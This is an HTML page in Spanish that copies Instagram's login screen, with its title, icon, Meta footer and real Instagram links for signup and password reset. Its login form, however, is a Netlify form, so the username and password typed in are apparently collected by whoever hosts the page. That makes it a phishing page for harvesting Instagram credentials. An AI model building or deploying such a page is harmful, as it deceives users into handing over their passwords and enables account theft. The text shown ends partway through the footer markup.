    <link rel="icon" href="instagram.ico">
    <title>Instagram</title>

<body>
    <div class="loginpage">
        <div class="contenedorregister">
            <form netlify>
                <h1>Instagram</h1>

                <div class="btn__facebook__container">
                    <div class="btn__facebook">
                        <i class="fa-brands fa-square-facebook"></i><a
                            href="https://www.instagram.com/reel/C5lWXPqOudw/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==">Continuar
                            con Facebook</a>
                    </div>
                </div>

                <div class="division">
                    <div class="line1"></div>
                    <div class="o"> <span> o </span> </div>
                    <div class="line2"></div>
                </div>

                <div class="input__box" Name="Email, telefono o correo electrónico: ">
                    <input class="form-control" placeholder="Telefono, usuario o correo electrónico" required>
                </div>
                <div class="input__box" name="contraseña">
                    <input placeholder="Contraseña" type="password" class="form-control" required>
                </div>

                <div class="forgotten__password__container">
                    <div class="forgotten__password">
                        <a href="https://www.instagram.com/accounts/password/reset/?hl=es">¿Olvidaste tu contraseña?</a>
                    </div>
                </div>

                <div>
                    <button id="login__button" type="submit" class="btn btn-primary btn__submit"><span>Iniciar
                            sesión</span></button>
                </div>

                <div class="Registrate">
                    <p>¿No tienes una cuenta? <a
                            href="https://www.instagram.com/accounts/signup/phone/?hl=es">Regístrate</a> </p>
                </div>
            </form>
        </div>
    </div>

    <footer>
        <div class="logo__container">
            <div class="logo">
                <p>from</p>
                <span><i class="fa-brands fa-meta"></i>Meta</span>
            </div>
        </div>

        <div class="box__conteiner">
            <div class="box">

            </div>
            <div class="box">
                <a href="#"> información</a>
            </div>
            <div class="box">

            </div>
            <div class="box">

            <div class="box">

            <div class="box">

            <div class="box">
